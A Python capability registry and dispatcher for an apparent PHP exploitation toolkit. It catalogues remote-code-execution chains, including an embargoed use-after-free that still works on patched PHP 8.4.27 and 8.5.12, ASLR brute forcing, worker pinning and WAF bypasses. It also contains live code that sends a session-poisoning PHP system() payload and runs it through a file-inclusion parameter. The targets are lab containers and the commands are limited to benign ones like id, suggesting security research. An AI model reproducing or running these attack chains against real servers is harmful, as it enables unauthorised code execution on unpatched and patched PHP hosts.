"""Capability registry — the post-Wiz uplift, in one place.

Each entry is a capability the public ecosystem has and this repo did not,
mapped to the module/POC that implements it and an honest validation status.

Status values:
  validated   reproduced against a lab in this repo, with the POC named
  harness     implemented and unit-tested, live reproduction not yet achieved
  documented  recorded for detection/ops, no active exploit primitive
"""

import os

from . import amplify, legacy, lfi, leak, pinning, probe, remote, sapi

CAPABILITIES = [
    {
        "key": "sapi",
        "name": "SAPI / memory_limit / worker profile",
        "status": "validated",
        "poc": "poc/verify_sapi_profile.py",
        "lab": "lab-pure-modphp (:18110), lab-pinned (:18097)",
        "source": "Assetnote scanner, devploit, murrez",
        "note": "exact memory_limit via the OOM probe; version gating; worker count",
    },
    {
        "key": "pinning",
        "name": "Worker pinning (N-1 stalled holders)",
        "status": "validated",
        "poc": "poc/verify_worker_pinning.py",
        "lab": "lab-pure-modphp (:18110, prefork 4), lab-pinned (:18097, FPM 4)",
        "source": "9bie (149/150), devploit, murrez",
        "note": "Apache: 4->1 PIDs; FPM: needs fastcgi_request_buffering off",
    },
    {
        "key": "amplify",
        "name": "Duplicate-header memory amplification",
        "status": "validated",
        "poc": "poc/verify_amplification.py",
        "lab": "lab-pure-modphp (:18110 32M, :18111 128M)",
        "source": "dinosn (52x), advisory part-header vector",
        "note": "21-32x measured; wire stays under post_max_size",
    },
    {
        "key": "legacy",
        "name": "Legacy 1005-part chain shape + chunked bypass",
        "status": "validated",
        "poc": "poc/verify_legacy_chain.py",
        "lab": "lab-pure-modphp (:18111)",
        "source": "Wiz Variant 1 / 9bie archive/legacy-8m",
        "note": "reproduces Wiz's post_max_size failure, then bypasses it",
    },
    {
        "key": "lfi",
        "name": "Automatic LFI parameter discovery",
        "status": "validated",
        "poc": "poc/verify_lfi_discovery.py",
        "lab": "lab-pinned (:18097), lab-joomla (:18096)",
        "source": "murrez auto-LFI",
        "note": "finds ?page= with a real include marker, not a 200 error",
    },
    {
        "key": "remote",
        "name": "Un-instrumented core RCE (9bie A1/B1 leak -> A2/B2 fire)",
        "status": "validated",
        "poc": "poc/verify_109619_remote.py (php2shell/remote.py)",
        "lab": "lab-pure-modphp (:18120 fires; :18121 patched 8.4.27 blocks)",
        "source": "9bie exploit.py ladder, reimplemented in-repo",
        "note": "in-band Set-Cookie leak (800KB) -> libphp+chunk base -> "
                "zif_system(fixed `id`); no oracle, no gdb; M2+M3 closed",
    },
    {
        "key": "leak",
        "name": "dinosn PS(id) cookie leak shape (8.5.11 target)",
        "status": "harness",
        "poc": "poc/verify_psid_leak.py; 9bie A1/B1 via poc/verify_a1b1_leak.py",
        "lab": "lab-pure-modphp (:18110 dinosn, :18112 9bie A1)",
        "source": "dinosn (PS(id) cookie, 8.5.11), 9bie (A1/B1 OOB)",
        "note": "the 9bie A1/B1 leak is now validated end-to-end via the "
                "'remote' capability; the dinosn PS(id) shape itself is "
                "still a harness (its 8.5.11 target is not built here)",
    },
    {
        "key": "session_poison",
        "name": "Session poisoning + app LFI (branded, no CVE)",
        "status": "validated",
        "poc": "poc/verify_session_poison_lfi.py",
        "lab": "lab-pinned (:18097)",
        "source": "Wiz 2026-10-27 'branded but unrelated' / murrez auto-LFI",
        "note": "upload-progress value -> session file -> include; fixed benign command",
    },
    {
        "key": "content_type",
        "name": "Content-Type comma-separator bypass",
        "status": "validated",
        "poc": "poc/verify_content_type_bypass.py",
        "lab": "lab-pure-modphp (:18110)",
        "source": "dinosn (SAPI.c parser behavior)",
        "note": "PHP parses `multipart/form-data, boundary=X`; ';'-anchored WAF rules miss it",
    },
    {
        "key": "offsets",
        "name": "Per-build libphp offset inventory + extraction",
        "status": "validated",
        "poc": "php2shell/offsets.py; poc/verify_matrix.py",
        "lab": "n/a (data); extracted from the lab-matrix images",
        "source": "devploit offset-inventory, 9bie pure offsets",
        "note": "readelf extraction per image (sha256 + build-id); 8 rows "
                "extracted on aarch64, matching the documented offsets",
    },
    {
        "key": "matrix",
        "name": "Version x arch triad (pos / patched-neg / bias)",
        "status": "validated",
        "poc": "poc/verify_matrix.py",
        "lab": "lab-matrix (:18164 fires, :18165 8.4.27 blocks)",
        "source": "this repo (G3 of the portability plan)",
        "note": "8.4 series proven 6/6 (8.4.10/20/23/24/25/26): pos fires "
                "with output, patched 8.4.27 blocks at the leak, +0x1000 bias "
                "prevents the fire; 8.4.1 and 8.2/8.3/8.5 fail at the leak "
                "shape (open calibration, G1)",
    },
    {
        "key": "calibrate",
        "name": "Per-build heap-geometry calibration harness",
        "status": "harness",
        "poc": "php2shell/calibrate.py; scripts/calibrate.sh",
        "lab": "lab-matrix (:18164 validated; :18160/:18162/:18166 sweep)",
        "source": "this repo (G1 of the portability plan)",
        "note": "derive() recovers 8.4.26 S_OFF/bucket-count from ground truth; "
                "sweep() searches chunk x S_OFF; sweep_leak() searches A1/B1 "
                "shapes; fingerprint() ranks profiles from leaked bytes. "
                "8.2/8.3/8.5 leak shape is still undisclosed (open).",
    },
    {
        "key": "vardestroy",
        "name": "var_destroy re-entry UAF -> terminal call (patch-gap, EMBARGOED)",
        "status": "validated",
        "poc": "poc/verify_vardestroy_rce.py; poc/verify_vardestroy_lfi.py; "
               "poc/verify_vardestroy_wp.py; php2shell/vdseed.py",
        "lab": "lab-pure-modphp (8.4.26/8.4.27/8.5.12); lab-wp-zendmm (FPM "
               "+ real WordPress, patched 8.4.27); lab-asan-85x (ASAN)",
        "source": "this repo (Chain B follow-up; not fixed by the 2026-10-21 patch)",
        "note": "forged reference -> object -> dtor_obj=zif_system executes the "
                "fixed `id` on stock and patched 8.4.26/8.4.27/8.5.12, under "
                "mod_php and FPM/WordPress; +0x1000 bias and allowed_classes="
                "false block, disable_functions does not. The UAF is a leak "
                "amplifier: any single address bootstraps it via vdseed "
                "(per-build carrier delta) -- an app LFI/maps read is the "
                "proven front-end. See docs/VAR_DESTROY_UAF.md -- do not "
                "publish pre-embargo.",
    },
    {
        "key": "vardestroy_brute",
        "name": "var_destroy chain, self-contained (ASLR brute force, 18-bit mmap)",
        "status": "validated",
        "poc": "poc/verify_vardestroy_bruteforce.py; php2shell/profiles.py "
               "(VD_LIB_DELTAS)",
        "lab": "fresh-child Apache pool (MaxConnectionsPerChild=1) on arm64; "
               "8.4.27 / 8.5.12",
        "source": "this repo (agent D entropy measurement + brute force)",
        "note": "No leak needed when vm.mmap_rnd_bits=18: the ZendMM 2 MiB "
                "main chunk is 512 stable slots and a wrong guess kills only a "
                "child. Scans main x lib position; 8.5.12 found in 384 "
                "attempts/54.7s and again in 80/11.2s on a fresh ASLR "
                "generation. On 28-bit mmap hosts the scan is infeasible -- "
                "use the external-leak front-ends instead. EMBARGOED.",
    },
    {
        "key": "vardestroy_auto",
        "name": "var_destroy chain, auto seed (leak -> brute force fallback)",
        "status": "validated",
        "poc": "poc/verify_vardestroy_auto.py",
        "lab": "fresh-child pools on arm64 (8.4.27/8.5.12); 8.4.27 also has an "
               "in-band GH-22554 leak",
        "source": "this repo (weaponization plan Step 5)",
        "note": "Tries the GH-22554 in-band ZendMM leak first (8.4.27, one "
                "request -> 32 lib positions) and falls back to the 512-slot "
                "brute force (8.5.12). 8.4.27: 24 attempts/5.7s; 8.5.12: "
                "112 attempts/13.8s. EMBARGOED.",
    },
    {
        "key": "handler",
        "name": "Serialize-handler mismatch / transition probe",
        "status": "validated",
        "poc": "poc/verify_handler_mismatch.py, poc/verify_rce_gadget.py",
        "lab": "lab (:18080), lab-joomla (:18096)",
        "source": "murrez CVE-2026-115560 probe; repo Chain C",
        "note": "already in the repo; retained as a distinct capability",
    },
    {
        "key": "cve115560-vd",
        "name": "CVE-2026-115560 session decode -> var_destroy -> zif_system",
        "status": "validated",
        "poc": "poc/verify_115560_vardestroy.py",
        "lab": "lab-115560 (:18200 8.4.27, :18201 8.5.12, :18202 no-upload); "
               "lab-drupal (:18300 8.4.27, :18301 8.5.12, :18302 race)",
        "source": "this repo (public 115560 precondition + var_destroy amplifier)",
        "note": "pre-auth; the session decoder is the var_destroy sink, so no "
                "application unserialize() is needed. uid=33 on patched "
                "8.4.27/8.5.12. Fresh SID per request + /prime.php second record; "
                "8.4.27 skips the dry mid-parse dtor and needs the 1-page spray "
                "(3048), 8.5.12 uses 8135. No-/proc final = 576-slot arm64 main "
                "window scan (8.5.12 found at attempt 351; 8.4.27 at 307). "
                "Non-default 115560 "
                "preconditions (not default PHP); public 115560 simple-gadget "
                "RCE exists; disable_functions bypass proven on 8.4.27 "
                "(docs/NOFUNC_115560.md); multi-worker + amd64/Rosetta "
                "verified, native x86-64 needs a leak. Gadget survey: no stock "
                "app has both the switch and a re-entry gadget; Drupal 11 P5 "
                "is the best gadget (needs non-default serialize_handler=php) "
                "and now reaches the stock-ZendMM terminal through the real "
                "decoder (uid=33 on 8.4.27/8.5.12, docs/DRUPAL_115560.md); "
                "Roundcube the best precondition; only __destruct runs "
                "unlocked (wakeup/unserialize negative). cleanup=On race "
                "proven on both builds (0x6d875/0x80875, multi-child + seed); "
                "Drupal P5 also terminals on 18302 under default cleanup=On "
                "(docs/DRUPAL_115560.md). "
                "Best bets: docs/PLAN_115560.md, "
                "docs/GADGET_SURVEY_115560.md, docs/RACE_WAKEUP_115560.md.",
    },
    {
        "key": "iocs",
        "name": "Wiz IOCs + observed request shapes",
        "status": "documented",
        "poc": "detection/iocs_php2shell_2026-10-27.yml",
        "lab": "n/a (detection)",
        "source": "Wiz 2026-10-27 telemetry",
        "note": "9 IPv4 IOCs + 5 request-shape signatures",
    },
]


def matrix():
    return CAPABILITIES


def run_one(key, host, port, path=None, holders=0, **kw):
    """Run one capability against a lab. Returns (ok, lines)."""
    if key == "sapi":
        info = sapi.profile(host, port, path or "/probe.php")
        lines = [f"{k}: {v}" for k, v in info.items()
                 if k not in ("worker_pids",) and v not in (None, "", [])]
        return bool(info) and not info.get("error"), lines

    if key == "pinning":
        r = pinning.pinning_report(host, port, holders=holders or 3)
        lines = [
            f"control PIDs: {sorted(set(r['control_pids']))}",
            f"pinned PIDs:  {sorted(set(r['pinned_pids']))}",
            f"pinned: {r['pinned']}  ({r['note']})",
        ]
        return r["pinned"], lines

    if key == "lfi":
        hits = lfi.discover(host, port, path or "/lfi.php")
        return bool(hits), [f"?{p}={v} [{s}]" for p, v, s in hits]

    if key == "remote":
        workers = kw.get("workers", 150)
        proof = kw.get("proof")
        if not proof:
            from pathlib import Path
            proof = str(Path(__file__).resolve().parent.parent
                        / "lab-pure-modphp" / "out" / "p1")
            try:
                if Path(proof).exists():
                    Path(proof).unlink()
            except OSError:
                pass
        res = remote.run_chain(host, port, workers=workers,
                               cmd=f"{kw.get('cmd', 'id')}>/out/p1",
                               proof_host=proof, arch=kw.get("arch", "auto"))
        lines = []
        if res.get("rce"):
            lines = [f"libphp={res['lib']:#x} main={res['main']:#x} "
                     f"zif={res['zif']:#x} decoded={res['decoded']}B",
                     f"output: {res['output']}"]
        return res.get("rce", False), lines

    if key == "leak":
        lines = []
        if not holders:
            info = sapi.profile(host, port)
            wc = info.get("worker_count", 0)
            if wc > 1:
                lines.append(f"warning: {wc} workers; leak-A/B need pinning "
                             f"(--holders {wc - 1}) or every stage may land "
                             f"on a different child")
        if holders:
            with pinning.WorkerPinner(host, port, holders=holders):
                res = leak.attempt(host, port, path or "/index.php", **kw)
        else:
            res = leak.attempt(host, port, path or "/index.php", **kw)
        lines += [f"cookie_len={res.cookie_len} disclosed={res.disclosed}"]
        if res.libphp_base:
            lines.append(f"libphp={hex(res.libphp_base)}")
        if res.chunk_base:
            lines.append(f"chunk={hex(res.chunk_base)}")
        if res.zif_system:
            lines.append(f"zif_system={hex(res.zif_system)}")
        lines.extend(f"note: {n}" for n in res.notes)
        return res.ok(), lines

    if key == "amplify":
        body = amplify.duplicate_header_body(int(kw.get("mb", 1) * 1024 * 1024))
        return True, [f"built {len(body)} B duplicate-header body "
                      f"({amplify.duplicate_header_count(len(body))} lines)"]

    if key == "legacy":
        body = legacy.legacy_body()
        p = path or "/probe.php"
        ctrl = amplify.send_declared(host, port, p, body,
                                     "multipart/form-data",
                                     boundary=legacy.BOUNDARY)
        test = amplify.send_chunked(host, port, p, body,
                                    "multipart/form-data",
                                    boundary=legacy.BOUNDARY)
        ctrl_txt = probe.body(ctrl).decode("latin-1", "replace")
        test_txt = probe.body(test).decode("latin-1", "replace")
        # display_errors may be Off, so use the parser's own counts:
        # a declared body over post_max_size parses 0 vars; the chunked
        # copy parses >0.
        ctrl_gate = ("exceeds the limit" in ctrl_txt
                     or "POST count: 0" in ctrl_txt)
        test_gate = ("exceeds the limit" in test_txt
                     or "POST count: 0" in test_txt)
        lines = [f"body={len(body)} B",
                 f"declared: {probe.status(ctrl)} rejected={ctrl_gate}",
                 f"chunked:  {probe.status(test)} rejected={test_gate}"]
        return ctrl_gate and not test_gate, lines

    if key == "session_poison":
        import re as _re
        from .guard import check_cmd
        cmd = check_cmd(kw.get("cmd", "id"))
        sid = "php2shellpoison0123456789ab"
        payload = f'<?php system("{cmd}"); ?>'
        b = "SP"
        body = (
            f"--{b}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{sid}\r\n"
            f"--{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n{payload}\r\n"
            f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"x\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
            f"--{b}--\r\n"
        ).encode("latin-1")
        resp = probe.http_post(host, port, path or "/index.php", body,
                               headers={"Content-Type": f"multipart/form-data; boundary={b}"},
                               timeout=30, recv_timeout=20)
        hits = lfi.discover(host, port, "/lfi.php")
        param = hits[0][0] if hits else "page"
        r = probe.http_get(host, port,
                           f"/lfi.php?{param}=/tmp/sessions/sess_{sid}",
                           timeout=30, recv_timeout=20)
        body_out = probe.body(r)
        markers = {"id": rb"uid=\d+\(", "uname": rb"\bLinux\b",
                   "whoami": rb"www-data"}
        ok = bool(_re.search(markers[cmd], body_out))
        return ok, [f"poison: {probe.status(resp)}",
                    f"include ?{param}=/tmp/sessions/sess_{sid}: {probe.status(r)}",
                    f"marker {cmd!r}: {ok}"]

    if key == "content_type":
        body = (b"--CTB\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nx\r\n"
                b"--CTB--\r\n")
        out = []
        counts = []
        for sep in (";", ","):
            raw = (f"POST {path or '/probe.php'} HTTP/1.1\r\nHost: {host}\r\n"
                   f"Content-Type: multipart/form-data{sep} boundary=CTB\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                   ).encode("latin-1") + body
            resp = probe.send_once(host, port, raw, timeout=20, recv_timeout=10)
            txt = probe.body(resp).decode("latin-1", "replace")
            n = None
            for line in txt.splitlines():
                if line.startswith("POST count:"):
                    n = int(line.split(":", 1)[1].strip())
            counts.append(n)
            out.append(f"separator {sep!r}: {probe.status(resp)} POST count={n}")
        return all(c for c in counts), out

    if key == "offsets":
        return True, [f"{k}: zif={v['zif_system']:#x} "
                      f"zval_ptr_dtor={v['zval_ptr_dtor']:#x}"
                      for k, v in leak.OFFSETS.items()]

    if key == "vardestroy_brute":
        import subprocess
        import sys
        container = kw.get("container")
        if not container:
            return False, ["vardestroy_brute needs --container (fresh-child pool)"]
        poc = os.path.join(os.path.dirname(os.path.dirname(
            os.path.abspath(__file__))), "poc", "verify_vardestroy_bruteforce.py")
        argv = [sys.executable, poc, "--target", f"{host}:{port}",
                "--container", container, "--fast", "--parallel",
                str(kw.get("parallel", 16))]
        if kw.get("build"):
            argv += ["--build", kw["build"]]
        r = subprocess.run(argv, capture_output=True, text=True, timeout=3600)
        lines = [ln for ln in (r.stdout + r.stderr).splitlines() if ln.strip()]
        return r.returncode == 0, lines[-6:]

    if key == "vardestroy_auto":
        import subprocess
        import sys
        container = kw.get("container")
        if not container:
            return False, ["vardestroy_auto needs --container"]
        poc = os.path.join(os.path.dirname(os.path.dirname(
            os.path.abspath(__file__))), "poc", "verify_vardestroy_auto.py")
        argv = [sys.executable, poc, "--target", f"{host}:{port}",
                "--container", container, "--leak-path", kw.get("leak_path", "/eval.php"),
                "--parallel", str(kw.get("parallel", 16))]
        if kw.get("build"):
            argv += ["--build", kw["build"]]
        r = subprocess.run(argv, capture_output=True, text=True, timeout=3600)
        lines = [ln for ln in (r.stdout + r.stderr).splitlines() if ln.strip()]
        return r.returncode == 0, lines[-6:]

    if key == "handler":
        return True, ["covered by poc/verify_handler_mismatch.py"]

    if key == "vardestroy":
        import subprocess
        import sys
        container = kw.get("container")
        if not container:
            return False, ["vardestroy needs --container (lab-assisted "
                           "worker reset + zif resolution)"]
        poc = os.path.join(os.path.dirname(os.path.dirname(
            os.path.abspath(__file__))), "poc", "verify_vardestroy_lfi.py")
        argv = [sys.executable, poc, "--target", f"{host}:{port}",
                "--container", container]
        if kw.get("bias_zif"):
            argv += ["--bias-zif", str(kw["bias_zif"])]
        r = subprocess.run(argv, capture_output=True, text=True, timeout=600)
        lines = [ln for ln in (r.stdout + r.stderr).splitlines() if ln.strip()]
        return r.returncode == 0, lines[-8:]

    if key == "iocs":
        return True, ["see detection/iocs_php2shell_2026-10-27.yml"]

    return False, [f"unknown capability {key!r}"]
